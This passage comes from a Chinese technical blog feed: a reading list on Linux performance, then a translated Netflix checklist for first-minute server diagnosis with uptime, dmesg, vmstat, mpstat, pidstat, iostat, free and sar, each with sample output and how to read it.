<li><a href="https://riboseyim.com/2017/05/29/Linux-Works-Boots/">How Linux Works：Boots</a></li>
<li><a href="https://riboseyim.com/2019/04/21/Linux-Works-User-Space/">How Linux Works：用户空间</a></li>
<li><a href="https://riboseyim.com/2017/12/11/Linux-Works-Memory/">How Linux Works：内存管理</a></li>
<li><a href="https://riboseyim.com/2018/01/08/Linux-Works-Network/">How Linux Works：网络管理</a></li>
<li>Preview<a href="https://riboseyim.com/2019/03/05/Linux-Works-Router/">How Linux Works：路由管理</a></li>
</ul>
<h4 id="动态追踪技术"><a href="#动态追踪技术" class="headerlink" title="动态追踪技术"></a>动态追踪技术</h4><ul>
<li><a href="https://riboseyim.com/2016/11/26/DTrace/">动态追踪技术(一)：DTrace 导论</a></li>
<li><a href="https://mp.weixin.qq.com/s?__biz=MjM5MTY1MjQ3Nw==&amp;mid=2651939588&amp;idx=1&amp;sn=35f71c5f88d1edf23cb2efc812ab8e6c&amp;chksm=bd578c168a20050041c08618281691f0111f61c789097a69095933057618637fc54817815921#rd">动态追踪技术(二)：strace+gdb 溯源 Nginx 内存溢出异常 </a></li>
<li><a href="https://riboseyim.com/2017/04/17/DTrace_FTrace/">动态追踪技术(三)：Tracing Your Kernel Function!</a></li>
<li><a href="https://riboseyim.com/2017/06/27/DTrace_bcc/">动态追踪技术(四)：基于 Linux bcc/BPF 实现 Go 程序动态追踪</a></li>
<li><a href="https://riboseyim.com/2018/02/16/DTrace-Linux/">动态追踪技术(五)：Welcome DTrace for Linux</a></li>
</ul>
<h4 id="案例与实务"><a href="#案例与实务" class="headerlink" title="案例与实务"></a>案例与实务</h4><ul>
<li><a href="https://riboseyim.github.io/2016/07/17/OpenSource-StackOverflow/">最佳工程实践：Stack Overflow 架构 - 2016 Edition</a></li>
<li><a href="https://riboseyim.github.io/2016/06/12/Technology-Oracle/">最佳工程实践：Oracle 数据库迁移割接实践</a></li>
<li><a href="https://riboseyim.github.io/2016/09/01/AAA/">最佳工程实践：基于LVS的AAA负载均衡架构实践</a>  </li>
<li><a href="https://code.facebook.com/posts/1906146702752923/open-sourcing-katran-a-scalable-network-load-balancer/">VIPServer | Facebook Open-sourcing Katran, a scalable network load balancer</a></li>
</ul>
<h2 id="推荐书单"><a href="#推荐书单" class="headerlink" title="推荐书单"></a>推荐书单</h2><h4 id="电子书《Linux-Perf-Master》"><a href="#电子书《Linux-Perf-Master》" class="headerlink" title="电子书《Linux Perf Master》"></a>电子书《Linux Perf Master》</h4><ul>
<li><a href="https://riboseyim.gitbook.io/perf">https://riboseyim.gitbook.io/perf</a></li>
<li><a href="https://www.gitbook.com/book/riboseyim/linux-perf-master/details">https://www.gitbook.com/book/riboseyim/linux-perf-master/details</a></li>
</ul>
<p><img src="http://riboseyim-qiniu.riboseyim.com/banner-LPM-201803.png" alt=""></p>
<h4 id="读书笔记-《图解性能优化》"><a href="#读书笔记-《图解性能优化》" class="headerlink" title="读书笔记|《图解性能优化》"></a><a href="https://riboseyim.github.io/2017/10/24/LinuxPerf-Picture/">读书笔记|《图解性能优化》</a></h4><ul>
<li>性能分析的基础:吞吐和响应的区别</li>
<li>实际系统中的性能分析</li>
<li>性能调优 &amp; 性能测试</li>
<li>虚拟化环境下的性能</li>
<li>云环境下的性能</li>
</ul>
<h4 id="《24小时365天不间断服务》"><a href="#《24小时365天不间断服务》" class="headerlink" title="《24小时365天不间断服务》"></a><a href="http://www.jianshu.com/p/7a633fdada4f">《24小时365天不间断服务》</a></h4><h4 id="《性能之巅》"><a href="#《性能之巅》" class="headerlink" title="《性能之巅》"></a><a href="http://www.jianshu.com/p/7a633fdada4f">《性能之巅》</a></h4><h4 id="《Google核心技术》"><a href="#《Google核心技术》" class="headerlink" title="《Google核心技术》"></a>《Google核心技术》</h4><h2 id="快捷方式"><a href="#快捷方式" class="headerlink" title="快捷方式"></a>快捷方式</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 按内存排序，由大到小;rsz为实际内存</span><br><span class="line">ps -e -o &#x27;pid,comm,args,pcpu,rsz,vsz,stime,user,uid&#x27; | grep oracle |  sort -nrk5</span><br><span class="line"></span><br><span class="line"># 查看打开的文件</span><br><span class="line">lsof</span><br><span class="line"></span><br><span class="line"># 查看 Threads</span><br><span class="line">ps m</span><br></pre></td></tr></table></figure>
<h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><ul>
<li><a href="https://www.toptal.com/back-end/server-side-io-performance-node-php-java-go">Server-side I/O Performance: Node vs. PHP vs. Java vs. Go</a></li>
<li><a href="Real-time distributed tracing for website performance and efficiency optimizations">Linkedin:Real-time distributed tracing for website performance and efficiency optimizations</a><ul>
<li><a href="http://www.jianshu.com/p/7a633fdada4f">推荐书单</a></li>
<li><a href="https://mp.weixin.qq.com/s?__biz=MjM5ODQ2MDIyMA==&amp;mid=2650713353&amp;idx=1&amp;sn=c2a2b22eafa6be8a18542b6752f8bd24&amp;chksm=bec0635a89b7ea4c7fe653aacb981434fd604665fe6d8d1775ecb169ef3eea43528e464af3de&amp;mpshare=1&amp;scene=1&amp;srcid=0713CHRf2HiItQatKLrXoxp4%23rd">程序员需要跨过性能这个坎 | 原创 2017-07-13 池建强 MacTalk</a></li>
<li><a href="https://mp.weixin.qq.com/s/qAcr02Hwjf_9_Ks3DwjHmw">望闻问切，解决Linux系统性能问题 | 2016-10-10 Brendan Gregg 开发资讯</a></li>
</ul>
</li>
</ul>
]]></content>
      <categories>
        <category>出版物</category>
      </categories>
      <tags>
        <tag>SRE</tag>
        <tag>DevOps</tag>
        <tag>Linux</tag>
        <tag>Engineering</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux 性能诊断:快速检查单(Netflix版)</title>
    <url>/2017/12/11/Linux-Perf-Netflix/</url>
    <content><![CDATA[<h2 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h2><ul>
<li>快速检查单QRH</li>
</ul>
<blockquote>
<p>请大家记住这样一个思路：先把大石头移开。大石头移开后，中等大小的石头可能就显现出来了。性能调优的原则就是先解决大问题，然后解决剩余问题中的大问题。在解决了大问题后，通常隐藏在它背后的问题也会暴露出来。也就是说，解决了前面的瓶颈后，下一个瓶颈就显现出来了。—— 《图解性能优化》</p>
</blockquote>
<span id="more"></span>
<h2 id="快速检查单"><a href="#快速检查单" class="headerlink" title="快速检查单"></a>快速检查单</h2><p>快速检查单（Quick Reference Handbook，QRH）是飞行员在飞行过程中依赖的重要指导性文件。</p>
<p>第一张飞行检查单起源于一次严重的航空事故。1935年波音公司研制的一架新型轰炸机在试飞过程中突然坠机，导致2名机组人员遇难——包括一名最优秀的试飞员普洛耶尔·希尔少校。后来的调查结果分析，事故并不是机械故障引起的，而是人为失误造成。新型飞机比以往的飞机更复杂，飞行员要管理4台发动机，操控起落架、襟翼、电动配平调整片和恒速液压变距螺旋桨等。因为忙于各种操作，希尔少校忘记了一项简单却很重要的工作 —— 在起飞前忘记对新设计的升降舵和方向舵实施解锁。</p>
<p>美国军方组织飞行专家编制了一份飞行检查单，将起飞、巡航、着陆和滑行各阶段的重要步骤写在一张索引卡片上。飞行员根据检查单的提示检查刹车是否松开，飞行仪表是否准确设定，机舱门窗是否完全关闭，升降舵等控制面是否已经解锁。</p>
<h2 id="Netflix-性能工程团队"><a href="#Netflix-性能工程团队" class="headerlink" title="Netflix 性能工程团队"></a>Netflix 性能工程团队</h2><p>登陆一台 Linux 服务器排查性能问题：<strong>开始一分钟你该检查哪些呢？</strong><br>在 Netflix 我们有一个庞大的 EC2 Linux集群，也有许多性能分析工具用于监视和检查它们的性能。它们包括用于云监测的Atlas (工具代号) ，用于实例分析的 Vector (工具代号) 。尽管这些工具能帮助我们解决大部分问题，我们有时也需要登陆一台实例、运行一些标准的 Linux 性能分析工具。在这篇文章，Netflix 性能工程团队将向您展示：在开始的60秒钟，利用标准的Linux命令行工具，执行一次充分的性能检查。</p>
<h2 id="Linux-性能分析黄金60秒"><a href="#Linux-性能分析黄金60秒" class="headerlink" title="Linux 性能分析黄金60秒"></a>Linux 性能分析黄金60秒</h2><p>运行以下10个命令，你可以在60秒内，获得系统资源利用率和进程运行情况的整体概念。查看是否存在异常、评估饱和度，它们都非常易于理解，可用性强。饱和度表示资源还有多少负荷可以让它处理，并且能够展示请求队列的长度或等待的时间。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">uptime</span><br><span class="line">dmesg | tail vmstat 1</span><br><span class="line">mpstat -P ALL 1 pidstat 1</span><br><span class="line">iostat -xz 1 free -m</span><br><span class="line">sar -n DEV 1</span><br><span class="line">sar -n TCP,ETCP 1 top</span><br></pre></td></tr></table></figure>
<ul>
<li><img src="http://upload-images.jianshu.io/upload_images/1037849-9981ca123c9bc27a.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="性能检查的一般步骤"></li>
</ul>
<p>这些命令需要安装sysstat包。这些命令输出的指标，将帮助你掌握一些有效的方法：一整套寻找性能瓶颈的方法论。这些命令需要检查所有资源的利用率、饱和度和错误信息（CPU、内存、磁盘等）。同时，当你检查或排除一些资源的时候，需要注意在检查过程中，根据指标数据指引，逐步缩小目标范围。</p>
<p>接下来的章节，将结合生产环境的案例演示这些命令。如果希望了解这些工具的详细信息，可以查阅它们的操作文档。</p>
<h4 id="1-uptime"><a href="#1-uptime" class="headerlink" title="1. uptime"></a>1. uptime</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ uptime</span><br><span class="line">23:51:26up21:31, 1user, loadaverage:30.02,26.43,19.02</span><br></pre></td></tr></table></figure>
<p>这是一个快速查看平均负载的方法，表示等待运行的任务（进程）数量。在Linux系统中，这些数字包含等待CPU运行的进程数，也包括不间断I/O阻塞的进程数（通常是磁盘I/O）。它展示了一个资源负载（或需求）的整体概念，但是无法理解其中的内涵，在没有其它工具的情况下。仅仅是一种快速查看手段而已。</p>
<p>这三个数字呈现出平均负载在几何级减弱，依次表示持续1分钟，5分钟和15分钟内。这三个数字能告诉我们负载在时间线上是如何变化的。举例说明，如果你在一个问题服务器上执行检查，1分钟的值远远低于15分钟的值，可以判断出你也许登录得太晚了，已经错过了问题。</p>
<p>在上面的例子中，平均负载的数值显示最近正在上升，1分钟值高达30，对比15分钟值则是19。这些指标值像现在这么大意味着很多情况：也许是CPU繁忙；vmstat 或者 mpstat 将可以确认，本系列的第三和第四条命令。</p>
<h4 id="2-dmesg-tail"><a href="#2-dmesg-tail" class="headerlink" title="2. dmesg | tail"></a>2. dmesg | tail</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">$ dmesg | tail</span><br><span class="line">[<span class="number">1880957.563150</span>] perl invoked oom-killer: gfp_mask=<span class="number">0x280da</span>, order=<span class="number">0</span>, oom_score_adj=<span class="number">0</span></span><br><span class="line">[...]</span><br><span class="line">[<span class="number">1880957.563400</span>] Out of memory: Kill process <span class="number">18694</span> (perl) score <span class="number">246</span> <span class="keyword">or</span> sacrifice child</span><br><span class="line">[<span class="number">1880957.563408</span>] Killed process <span class="number">18694</span> (perl) total-vm:<span class="number">1972392</span>kB, anon-rss:<span class="number">1953348</span>kB, file-r</span><br><span class="line">ss:<span class="number">0</span>kB</span><br><span class="line">[<span class="number">2320864.954447</span>] TCP: Possible SYN flooding on port <span class="number">7001.</span> Dropping request. Check SNMP cou</span><br><span class="line">nters.</span><br></pre></td></tr></table></figure>
<p>这个结果输出了最近10条系统信息。可以查看到引起性能问题的错误。上面的例子包含了oom-killer,以及TCP丢包。</p>
<blockquote>
<p>译者注:除了error级的日志，info级的也要留个心眼，可能包含一些隐藏信息。</p>
</blockquote>
<h4 id="3-vmstat-1"><a href="#3-vmstat-1" class="headerlink" title="3. vmstat 1"></a>3. vmstat 1</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">$ vmstat <span class="number">1</span></span><br><span class="line">procs ---------memory---------- ---swap-- -----io---- -system-- ------cpu-----</span><br><span class="line">r b swpd <span class="built_in">free</span> buff cache si so bi bo in cs us sy id wa st</span><br><span class="line"><span class="number">34</span> <span class="number">0</span> <span class="number">0</span> <span class="number">200889792</span> <span class="number">73708</span> <span class="number">591828</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">5</span> <span class="number">6</span> <span class="number">10</span> <span class="number">96</span> <span class="number">1</span> <span class="number">3</span> <span class="number">0</span> <span class="number">0</span></span><br><span class="line"><span class="number">32</span> <span class="number">0</span> <span class="number">0</span> <span class="number">200889920</span> <span class="number">73708</span> <span class="number">591860</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">592</span> <span class="number">13284</span> <span class="number">4282</span> <span class="number">98</span> <span class="number">1</span> <span class="number">1</span> <span class="number">0</span> <span class="number">0</span></span><br><span class="line"><span class="number">32</span> <span class="number">0</span> <span class="number">0</span> <span class="number">200890112</span> <span class="number">73708</span> <span class="number">591860</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">9501</span> <span class="number">2154</span> <span class="number">99</span> <span class="number">1</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span></span><br><span class="line"><span class="number">32</span> <span class="number">0</span> <span class="number">0</span> <span class="number">200889568</span> <span class="number">73712</span> <span class="number">591856</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">48</span> <span class="number">11900</span> <span class="number">2459</span> <span class="number">99</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span></span><br><span class="line"><span class="number">32</span> <span class="number">0</span> <span class="number">0</span> <span class="number">200890208</span> <span class="number">73712</span> <span class="number">591860</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">15898</span> <span class="number">4840</span> <span class="number">98</span> <span class="number">1</span> <span class="number">1</span> <span class="number">0</span> <span class="number">0</span></span><br></pre></td></tr></table></figure>
<p><strong>vmstat</strong> 是一个获得虚拟内存状态概况的通用工具（最早创建于10年前的BSD）。它每一行记录了关键的服务器统计信息。vmstat 运行的时候有一个参数1，用于输出一秒钟的概要数据。第一行输出显示启动之后的平均值，用以替代之前的一秒钟数据。现在，跳过第一行，让我们来学习并且记住每一列代表的意义。</p>
<p><strong>r</strong>：正在CPU上运行或等待运行的进程数。相对于平均负载来说，这提供了一个更好的、用于查明CPU饱和度的指标，它不包括I/O负载。注: “r”值大于CPU数即是饱和。</p>
<p><strong>free</strong>: 空闲内存（kb)<br>如果这个数值很大，表明你还有足够的内存空闲。包括命令7“free m”，很好地展现了空闲内存的状态。</p>
<p><strong>si, so</strong>: swap入／出。如果这个值非0，证明内存溢出了。</p>
<p><strong>us, sy, id, wa, st</strong>:它们是CPU分类时间，针对所有CPU的平均访问。分别是用户时间，系统时间（内核），空闲，I/O等待时间，以及被偷走的时间（其它访客，或者是Xen）。CPU分类时间将可以帮助确认，CPU是否繁忙，通过累计用户系统时间。等待I/O的情形肯定指向的是磁盘瓶颈；这个时候CPU通常是空闲的，因为任务被阻塞以等待分配磁盘I/O。你可以将等待I/O当作另一种CPU空闲，一种它们为什么空闲的解释线索。</p>
<p>系统时间对I/O处理非常必要。一个很高的平均系统时间，超过20%，值得深入分析：也许是内核处理I/O非常低效。在上面的例子中，CPU时间几乎完全是用户级的，与应用程序级的利用率正好相反。所有CPU的平均利用率也超过90%。这不一定是一个问题；还需检查“r”列的饱和度。</p>
<h4 id="4-mpstat-P-ALL-1"><a href="#4-mpstat-P-ALL-1" class="headerlink" title="4. mpstat P ALL 1"></a>4. mpstat P ALL 1</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">$ mpstat -P ALL <span class="number">1</span></span><br><span class="line">Linux <span class="number">3.13</span><span class="number">.0</span><span class="number">-49</span>-generic (titanclusters-xxxxx) <span class="number">07</span>/<span class="number">14</span>/<span class="number">2015</span> _x86_64_ (<span class="number">32</span> CPU)</span><br><span class="line"><span class="number">07</span>:<span class="number">38</span>:<span class="number">49</span> PM CPU %usr %nice %sys %iowait %irq %soft %steal %guest %gnice %idle</span><br><span class="line"><span class="number">07</span>:<span class="number">38</span>:<span class="number">50</span> PM all <span class="number">98.47</span> <span class="number">0.00</span> <span class="number">0.75</span> <span class="number">0.00</span> <span class="number">0.00</span> <span class="number">0.00</span> <span class="number">0.00</span> <span class="number">0.00</span> <span class="number">0.00</span> <span class="number">0.78</span></span><br><span class="line"><span class="number">07</span>:<span class="number">38</span>:<span class="number">50</span> PM <span class="number">0</span> <span class="number">96.04</span> <span class="number">0.00</span> <span class="number">2.97</span> <span class="number">0.00</span> <span class="number">0.00</span> <span class="number">0.00</span> <span class="number">0.00</span> <span class="number">0.00</span> <span class="number">0.00</span> <span class="number">0.99</span></span><br><span class="line"><span class="number">07</span>:<span class="number">38</span>:<span class="number">50</span> PM <span class="number">1</span> <span class="number">97.00</span> <span class="number">0.00</span> <span class="number">1.00</span> <span class="number">0.00</span> <span class="number">0.00</span> <span class="number">0.00</span> <span class="number">0.00</span> <span class="number">0.00</span> <span class="number">0.00</span> <span class="number">2.00</span></span><br><span class="line"><span class="number">07</span>:<span class="number">38</span>:<span class="number">50</span> PM <span class="number">2</span> <span class="number">98.00</span> <span class="number">0.00</span> <span class="number">1.00</span> <span class="number">0.00</span> <span class="number">0.00</span> <span class="number">0.00</span> <span class="number">0.00</span> <span class="number">0.00</span> <span class="number">0.00</span> <span class="number">1.00</span></span><br><span class="line"><span class="number">07</span>:<span class="number">38</span>:<span class="number">50</span> PM <span class="number">3</span> <span class="number">96.97</span> <span class="number">0.00</span> <span class="number">0.00</span> <span class="number">0.00</span> <span class="number">0.00</span> <span class="number">0.00</span> <span class="number">0.00</span> <span class="number">0.00</span> <span class="number">0.00</span> <span class="number">3.03</span></span><br><span class="line">[...]</span><br></pre></td></tr></table></figure>
<p>这个命令可以按时间线打印每个CPU的消耗，常常用于检查不均衡的问题。如果只有一个繁忙的CPU，可以判断是属于单进程的应用程序。</p>
<h4 id="5-pidstat-1"><a href="#5-pidstat-1" class="headerlink" title="5. pidstat 1"></a>5. pidstat 1</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">$ pidstat <span class="number">1</span></span><br><span class="line">Linux <span class="number">3.13</span><span class="number">.0</span><span class="number">-49</span>-generic (titanclusters-xxxxx) <span class="number">07</span>/<span class="number">14</span>/<span class="number">2015</span> _x86_64_ (<span class="number">32</span> CPU)</span><br><span class="line"><span class="number">07</span>:<span class="number">41</span>:<span class="number">02</span> PM UID PID %usr %system %guest %CPU CPU Command</span><br><span class="line"><span class="number">07</span>:<span class="number">41</span>:<span class="number">03</span> PM <span class="number">0</span> <span class="number">9</span> <span class="number">0.00</span> <span class="number">0.94</span> <span class="number">0.00</span> <span class="number">0.94</span> <span class="number">1</span> rcuos/<span class="number">0</span></span><br><span class="line"><span class="number">07</span>:<span class="number">41</span>:<span class="number">03</span> PM <span class="number">0</span> <span class="number">4214</span> <span class="number">5.66</span> <span class="number">5.66</span> <span class="number">0.00</span> <span class="number">11.32</span> <span class="number">15</span> mesos-slave</span><br><span class="line"><span class="number">07</span>:<span class="number">41</span>:<span class="number">03</span> PM <span class="number">0</span> <span class="number">4354</span> <span class="number">0.94</span> <span class="number">0.94</span> <span class="number">0.00</span> <span class="number">1.89</span> <span class="number">8</span> java</span><br><span class="line"><span class="number">07</span>:<span class="number">41</span>:<span class="number">03</span> PM <span class="number">0</span> <span class="number">6521</span> <span class="number">1596.23</span> <span class="number">1.89</span> <span class="number">0.00</span> <span class="number">1598.11</span> <span class="number">27</span> java</span><br><span class="line"><span class="number">07</span>:<span class="number">41</span>:<span class="number">03</span> PM <span class="number">0</span> <span class="number">6564</span> <span class="number">1571.70</span> <span class="number">7.55</span> <span class="number">0.00</span> <span class="number">1579.25</span> <span class="number">28</span> java</span><br><span class="line"><span class="number">07</span>:<span class="number">41</span>:<span class="number">03</span> PM <span class="number">60004</span> <span class="number">60154</span> <span class="number">0.94</span> <span class="number">4.72</span> <span class="number">0.00</span> <span class="number">5.66</span> <span class="number">9</span> pidstat</span><br><span class="line"><span class="number">07</span>:<span class="number">41</span>:<span class="number">03</span> PM UID PID %usr %system %guest %CPU CPU Command</span><br><span class="line"><span class="number">07</span>:<span class="number">41</span>:<span class="number">04</span> PM <span class="number">0</span> <span class="number">4214</span> <span class="number">6.00</span> <span class="number">2.00</span> <span class="number">0.00</span> <span class="number">8.00</span> <span class="number">15</span> mesos-slave</span><br><span class="line"><span class="number">07</span>:<span class="number">41</span>:<span class="number">04</span> PM <span class="number">0</span> <span class="number">6521</span> <span class="number">1590.00</span> <span class="number">1.00</span> <span class="number">0.00</span> <span class="number">1591.00</span> <span class="number">27</span> java</span><br><span class="line"><span class="number">07</span>:<span class="number">41</span>:<span class="number">04</span> PM <span class="number">0</span> <span class="number">6564</span> <span class="number">1573.00</span> <span class="number">10.00</span> <span class="number">0.00</span> <span class="number">1583.00</span> <span class="number">28</span> java</span><br><span class="line"><span class="number">07</span>:<span class="number">41</span>:<span class="number">04</span> PM <span class="number">108</span> <span class="number">6718</span> <span class="number">1.00</span> <span class="number">0.00</span> <span class="number">0.00</span> <span class="number">1.00</span> <span class="number">0</span> snmp-pass</span><br><span class="line"><span class="number">07</span>:<span class="number">41</span>:<span class="number">04</span> PM <span class="number">60004</span> <span class="number">60154</span> <span class="number">1.00</span> <span class="number">4.00</span> <span class="number">0.00</span> <span class="number">5.00</span> <span class="number">9</span> pidstat</span><br><span class="line">^C</span><br></pre></td></tr></table></figure>
<p>pidstat 有一点像顶级视图－针对每一个进程，但是输出的时候滚屏，而不是清屏。它非常有用，特别是跨时间段查看的模式，也能将你所看到的信息记录下来，以利于进一步的研究。上面的例子识别出两个 java 进程引起的CPU耗尽。“％CPU” 是对所有CPU的消耗；1591% 显示 java 进程占用了几乎16个CPU。</p>
<h4 id="6-iostat-xz-1"><a href="#6-iostat-xz-1" class="headerlink" title="6. iostat xz 1"></a>6. iostat xz 1</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">$ iostat -xz <span class="number">1</span></span><br><span class="line">Linux <span class="number">3.13</span><span class="number">.0</span><span class="number">-49</span>-generic (titanclusters-xxxxx) <span class="number">07</span>/<span class="number">14</span>/<span class="number">2015</span> _x86_64_ (<span class="number">32</span> CPU)</span><br><span class="line">avg-cpu: %user %nice %system %iowait %steal %idle</span><br><span class="line"><span class="number">73.96</span> <span class="number">0.00</span> <span class="number">3.73</span> <span class="number">0.03</span> <span class="number">0.06</span> <span class="number">22.21</span></span><br><span class="line">Device: rrqm/s wrqm/s r/s w/s rkB/s wkB/s avgrq-sz avgqu-sz await r_await w_await svctm %util</span><br><span class="line">xvda <span class="number">0.00</span> <span class="number">0.23</span> <span class="number">0.21</span> <span class="number">0.18</span> <span class="number">4.52</span> <span class="number">2.08</span> <span class="number">34.37</span> <span class="number">0.00</span> <span class="number">9.98</span> <span class="number">13.80</span> <span class="number">5.42</span> <span class="number">2.44</span> <span class="number">0.09</span></span><br><span class="line">xvdb <span class="number">0.01</span> <span class="number">0.00</span> <span class="number">1.02</span> <span class="number">8.94</span> <span class="number">127.97</span> <span class="number">598.53</span> <span class="number">145.79</span> <span class="number">0.00</span> <span class="number">0.43</span> <span class="number">1.78</span> <span class="number">0.28</span> <span class="number">0.25</span> <span class="number">0.25</span></span><br><span class="line">xvdc <span class="number">0.01</span> <span class="number">0.00</span> <span class="number">1.02</span> <span class="number">8.86</span> <span class="number">127.79</span> <span class="number">595.94</span> <span class="number">146.50</span> <span class="number">0.00</span> <span class="number">0.45</span> <span class="number">1.82</span> <span class="number">0.30</span> <span class="number">0.27</span> <span class="number">0.26</span></span><br><span class="line">dm<span class="number">-0</span> <span class="number">0.00</span> <span class="number">0.00</span> <span class="number">0.69</span> <span class="number">2.32</span> <span class="number">10.47</span> <span class="number">31.69</span> <span class="number">28.01</span> <span class="number">0.01</span> <span class="number">3.23</span> <span class="number">0.71</span> <span class="number">3.98</span> <span class="number">0.13</span> <span class="number">0.04</span></span><br><span class="line">dm<span class="number">-1</span> <span class="number">0.00</span> <span class="number">0.00</span> <span class="number">0.00</span> <span class="number">0.94</span> <span class="number">0.01</span> <span class="number">3.78</span> <span class="number">8.00</span> <span class="number">0.33</span> <span class="number">345.84</span> <span class="number">0.04</span> <span class="number">346.81</span> <span class="number">0.01</span> <span class="number">0.00</span></span><br><span class="line">dm<span class="number">-2</span> <span class="number">0.00</span> <span class="number">0.00</span> <span class="number">0.09</span> <span class="number">0.07</span> <span class="number">1.35</span> <span class="number">0.36</span> <span class="number">22.50</span> <span class="number">0.00</span> <span class="number">2.55</span> <span class="number">0.23</span> <span class="number">5.62</span> <span class="number">1.78</span> <span class="number">0.03</span></span><br><span class="line">[...]</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>这是一个理解块设备（磁盘）极好的工具，不论是负载评估还是作为性能测试成绩。</p>
<p><strong>r/s, w/s, rkB/s, wkB/s</strong>: 这些是该设备每秒读％、写％、读Kb、写Kb。可用于描述工作负荷。一个性能问题可能只是简单地由于一个过量的负载引起。</p>
<p><strong>await</strong>: I/O平均时间（毫秒）<br>这是应用程序需要的时间，它包括排队以及运行的时间。<br>远远大于预期的平均时间可以作为设备饱和，或者设备问题的指标。</p>
<p><strong>avgqu­sz</strong>: 向设备发出的平均请求数。<br>值大于1可视为饱和（尽管设备能对请求持续运行，特别是前端的虚拟设备－后端有多个磁盘）。</p>
<p><strong>%util</strong>: 设备利用率<br>这是一个实时的繁忙的百分比，显示设备每秒钟正在进行的工作。值大于60%属于典型的性能不足（可以从await处查看），尽管它取决于设备。值接近100% 通常指示饱和。￼￼如果存储设备是一个前端逻辑磁盘、后挂一堆磁盘，那么100%的利用率也许意味着，一些已经处理的I/O此时占用100%，然而，后端的磁盘也许远远没有达到饱和，其实可以承担更多的工作。</p>
<p>切记：磁盘I/O性能低并不一定是应用程序问题。许多技术一贯使用异步I/O，所以应用程序并不会阻塞，以及遭受直接的延迟（例如提前加载，缓冲写入）。</p>
<h4 id="7-free-m"><a href="#7-free-m" class="headerlink" title="7. free m"></a>7. free m</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">free</span> -m</span><br><span class="line">total used <span class="built_in">free</span> shared buffers cached</span><br><span class="line">Mem: <span class="number">245998</span> <span class="number">24545</span> <span class="number">221453</span> <span class="number">83</span> <span class="number">59</span> <span class="number">541</span></span><br><span class="line">-/+ buffers/cache: <span class="number">23944</span> <span class="number">222053</span></span><br><span class="line">Swap: <span class="number">0</span> <span class="number">0</span> <span class="number">0</span></span><br></pre></td></tr></table></figure>
<p><strong>buffers</strong>: buffer cache,用于块设备I/O。<br><strong>cached</strong>:page cache, 用于文件系统。<br>￼ ￼<br>我们只是想检查这些指标值不为0——那样意味着磁盘I/O高、性能差（确认需要用iostat）。上面的例子看起来不错，每一类内存都有富余。</p>
<p><strong>“­/+ buffers/cache”</strong>: 提供了关于内存利用率更加准确的数值。</p>
<p>Linux可以将空闲内存用于缓存，并且在应用程序需要的时候收回。所以应用到缓存的内存必须以另一种方式包括在内存空闲的数据里面。有一个网站<a href="http://www.linuxatemyram.com/">linux ate my ram</a>,专门探讨这个困惑。它还有更令人困惑的地方，如果在Linux上使用ZFS,正如我们运行一些服务，ZFS拥有自己的文件系统缓存，也不能在free -m 的输出里正确反映。这种情况会显示系统空闲内存不足，但是内存实际上可用，通过回收 ZFS 的缓存。</p>
<p>关于 Linux 内存管理的更多内容，可以阅读<a href="https://riboseyim.github.io/2017/12/11/Linux-Works-Memory/">操作系统原理：How Linux Works (Memroy)</a>。</p>
<h4 id="8-sar-n-DEV-1"><a href="#8-sar-n-DEV-1" class="headerlink" title="8. sar n DEV 1"></a>8. sar n DEV 1</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">$ sar -n DEV <span class="number">1</span></span><br><span class="line">Linux <span class="number">3.13</span><span class="number">.0</span><span class="number">-49</span>-generic (titanclusters-xxxxx) <span class="number">07</span>/<span class="number">14</span>/<span class="number">2015</span> _x86_64_ (<span class="number">32</span> CPU)</span><br><span class="line"><span class="number">12</span>:<span class="number">16</span>:<span class="number">48</span> AM IFACE rxpck/s txpck/s rxkB/s txkB/s rxcmp/s txcmp/s rxmcst/s %ifutil</span><br><span class="line"><span class="number">12</span>:<span class="number">16</span>:<span class="number">49</span> AM eth0 <span class="number">18763.00</span> <span class="number">5032.00</span> <span class="number">20686.42</span> <span class="number">478.30</span> <span class="number">0.00</span> <span class="number">0.00</span> <span class="number">0.00</span> <span class="number">0.00</span></span><br><span class="line"><span class="number">12</span>:<span class="number">16</span>:<span class="number">49</span> AM lo <span class="number">14.00</span> <span class="number">14.00</span> <span class="number">1.36</span> <span class="number">1.36</span> <span class="number">0.00</span> <span class="number">0.00</span> <span class="number">0.00</span> <span class="number">0.00</span></span><br><span class="line"><span class="number">12</span>:<span class="number">16</span>:<span class="number">49</span> AM docker0 <span class="number">0.00</span> <span class="number">0.00</span> <span class="number">0.00</span> <span class="number">0.00</span> <span class="number">0.00</span> <span class="number">0.00</span> <span class="number">0.00</span> <span class="number">0.00</span></span><br><span class="line"><span class="number">12</span>:<span class="number">16</span>:<span class="number">49</span> AM IFACE rxpck/s txpck/s rxkB/s txkB/s rxcmp/s txcmp/s rxmcst/s %ifutil</span><br><span class="line"><span class="number">12</span>:<span class="number">16</span>:<span class="number">50</span> AM eth0 <span class="number">19763.00</span> <span class="number">5101.00</span> <span class="number">21999.10</span> <span class="number">482.56</span> <span class="number">0.00</span> <span class="number">0.00</span> <span class="number">0.00</span> <span class="number">0.00</span></span><br><span class="line"><span class="number">12</span>:<span class="number">16</span>:<span class="number">50</span> AM lo <span class="number">20.00</span> <span class="number">20.00</span> <span class="number">3.25</span> <span 